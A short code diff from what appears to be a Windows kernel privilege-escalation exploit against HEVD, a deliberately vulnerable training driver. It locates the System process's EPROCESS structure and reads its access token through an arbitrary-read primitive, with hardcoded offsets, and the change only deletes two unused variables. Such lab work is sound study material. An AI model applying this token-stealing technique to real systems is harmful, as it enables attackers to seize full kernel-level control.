@@ -188,7 +188,6 @@ int main()
 	}
 	LPVOID moduleBaseNtos = LeakModuleBaseAddress((char*)"ntoskrnl.exe");
 	uint64_t PsInitialSystemProcess = (uint64_t)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (uint64_t)hNtOsKrnl + (uint64_t)moduleBaseNtos;
-	uint64_t PsInitialSystemProcess2 =  (ULONGLONG)((ULONGLONG)moduleBaseNtos);
 
 	//ntoskrnl resource is no longer needed
 	FreeLibrary(hNtOsKrnl);
@@ -200,7 +199,6 @@ int main()
 	printf("[+] Found System EPROCESS struct at 0x%p\n", SystemEPROCESS);
 
 	DWORD EPROCESS_ActiveProcessLinks = 0x448;
-	DWORD EPROCESS_Token = 0x348;
 	DWORD EPROCESS_Token_offset = 0x4b8;
 	//from system EPROCESS get ActiveProcessLinks (we need to find our EPROCESS)
 	uint64_t readToken = ReadAddress(hevd, SystemEPROCESS + EPROCESS_Token_offset);
